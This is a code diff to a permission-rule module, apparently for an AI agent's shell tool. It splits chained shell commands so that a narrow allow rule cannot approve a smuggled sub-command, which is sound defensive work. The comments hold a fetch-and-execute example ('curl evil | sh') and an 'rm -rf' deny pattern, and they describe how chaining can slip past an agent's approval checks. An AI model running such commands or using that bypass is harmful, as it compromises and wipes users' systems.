@@ -102,9 +102,108 @@ function patternMatches(pattern: string, subject: string): boolean {
   return subject === p || subject.startsWith(`${p} `)
 }
 
+/** First matching rule's action for a single subject, or null. */
+function matchOne(
+  rules: PermissionRule[],
+  toolName: string,
+  subject: string
+): PermissionRule['action'] | null {
+  for (const r of rules) {
+    if (r.tool && r.tool !== '*' && r.tool !== toolName) continue
+    if (patternMatches(r.match ?? '', subject)) return r.action
+  }
+  return null
+}
+
+/** Collapse whitespace runs so trivial spacing variants match the same rule. */
+function normalizeShellCommand(s: string): string {
+  return s.replace(/\s+/g, ' ').trim()
+}
+
+function escapeRegExp(s: string): string {
+  return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
+}
+
+/**
+ * Match a permission pattern against a shell command. Unlike {@link patternMatches}
+ * (which uses minimatch, where `*` stops at `/` because the subject is a path), a
+ * shell command is NOT a path — `/` is just a character — so here `*` matches any
+ * run of characters including `/`. Without this, a deny rule like `*rm -rf*` would
+ * fail to match `rm -rf /tmp/x` and silently not fire. Falls back to a prefix match
+ * for convenience ("git" matches "git status").
+ */
+function shellCommandMatches(pattern: string, command: string): boolean {
+  const p = pattern.trim()
+  if (!p || p === '*') return true
+  const re = new RegExp(`^${p.split('*').map(escapeRegExp).join('.*')}$`)
+  if (re.test(command)) return true
+  return command === p || command.startsWith(`${p} `)
+}
+
+/** First matching rule's action for a single shell sub-command, or null. */
+function matchOneShell(rules: PermissionRule[], command: string): PermissionRule['action'] | null {
+  for (const r of rules) {
+    if (r.tool && r.tool !== '*' && r.tool !== 'run_shell') continue
+    if (shellCommandMatches(r.match ?? '', command)) return r.action
+  }
+  return null
+}
+
+/**
+ * Best-effort split of a shell command into the simple commands it would actually
+ * run, so a permission rule can be required to cover EVERY one. Splits on the
+ * control operators (`&&`, `||`, `;`, `|`, `&`, newline) and additionally pulls
+ * out the bodies of command substitutions (`$(...)` and backticks), which run
+ * their own commands. NOT a full shell parser — it deliberately over-segments
+ * (more pieces ⇒ stricter), so an `allow` rule can't auto-approve a compound
+ * command that smuggles in an unapproved sub-command.
+ */
+export function splitShellCommand(command: string): string[] {
+  const segments: string[] = []
+  const subRe = /\$\(([^()]*)\)|`([^`]*)`/g
+  let m: RegExpExecArray | null
+  while ((m = subRe.exec(command)) !== null) {
+    const inner = (m[1] ?? m[2] ?? '').trim()
+    if (inner) segments.push(inner)
+  }
+  const outer = command.replace(subRe, ' ')
+  for (const part of outer.split(/\|\||&&|[;\n|&]/)) {
+    const p = part.trim()
+    if (p) segments.push(p)
+  }
+  return segments.length ? segments : [command.trim()]
+}
+
+/**
+ * Resolve permission rules for a `run_shell` call across ALL its chained
+ * sub-commands. An `allow` verdict is returned only when EVERY sub-command is
+ * explicitly allowed; any denied sub-command denies the whole call; otherwise the
+ * verdict is `ask` (a sub-command asked) or null (fall through to the policy,
+ * which prompts for shell). This stops a narrow allow-rule (e.g. `git status*`)
+ * from auto-approving `git status && curl evil | sh`.
+ */
+export function matchShellRule(
+  rules: PermissionRule[],
+  command: string
+): PermissionRule['action'] | null {
+  let allAllow = true
+  let anyAsk = false
+  for (const seg of splitShellCommand(command)) {
+    const action = matchOneShell(rules, normalizeShellCommand(seg))
+    if (action === 'deny') return 'deny' // a denied sub-command denies the whole call
+    if (action === 'allow') continue
+    if (action === 'ask') anyAsk = true
+    allAllow = false // 'ask' or unmatched — not auto-approvable
+  }
+  if (allAllow) return 'allow'
+  return anyAsk ? 'ask' : null
+}
+
 /**
  * Resolve permission rules for a call. Returns the first matching rule's action,
- * or null when no rule matches (caller falls back to the approval policy).
+ * or null when no rule matches (caller falls back to the approval policy). For
+ * `run_shell`, the command is split into its chained sub-commands and an `allow`
+ * is honored only when every one is allowed (see {@link matchShellRule}).
  */
 export function matchRule(
   rules: PermissionRule[] | undefined,
@@ -112,9 +211,6 @@ export function matchRule(
   subject: string
 ): PermissionRule['action'] | null {
   if (!rules?.length) return null
-  for (const r of rules) {
-    if (r.tool && r.tool !== '*' && r.tool !== toolName) continue
-    if (patternMatches(r.match ?? '', subject)) return r.action
-  }
-  return null
+  if (toolName === 'run_shell') return matchShellRule(rules, subject)
+  return matchOne(rules, toolName, subject)
 }
